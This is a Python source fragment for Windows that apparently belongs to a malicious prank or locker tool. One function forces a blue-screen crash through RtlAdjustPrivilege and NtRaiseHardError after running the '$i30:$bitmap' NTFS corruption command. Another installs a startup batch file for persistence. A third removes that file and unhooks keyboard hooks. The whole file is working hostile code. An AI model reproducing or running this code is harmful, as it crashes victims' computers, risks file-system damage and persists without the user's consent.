#! /usr/bin python
# -*- coding: utf-8 -*-
import getpass
import os
import keyboard
import ctypes
import subprocess
import ctypes.wintypes

def bsod():
	subprocess.call("cd C:\:$i30:$bitmap",shell=True)
	ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
	ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))


def startup(path):
	USER_NAME = getpass.getuser()
	global bat_path
	bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
	
	with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
		bat_file.write(r'start "" %s' % path)

def uninstall(wind):
	wind.destroy()
	os.remove(bat_path + '\\' + "open.bat")
	keyboard.unhook_all()







